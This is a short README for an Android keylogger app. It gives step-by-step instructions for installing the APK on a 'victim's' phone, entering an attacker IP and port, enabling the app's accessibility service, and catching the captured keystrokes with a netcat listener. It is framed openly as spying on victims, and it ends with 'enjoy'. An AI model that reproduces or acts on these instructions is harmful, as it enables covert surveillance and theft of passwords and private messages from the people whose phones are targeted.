# Android-Keylogger
A an app that collets all the typed data of the victim


# How to use 
I have uploaded the necessary java files so if you want to do some changes then go ahead or you can just install the keylogger 8.0.apk 
Install the app on victim's phone 
Open it a write your ip and port in this ip:port format eg. 0.0.0.0:4444
Then click on send it will direct you to accessibility settings 
Switch on the keylogger accessibility 

Now open the netcat or any other listener on that ip and port on your machine or phone 
And now just wait for the victim to go online... 
And enjoy ðŸ˜‰
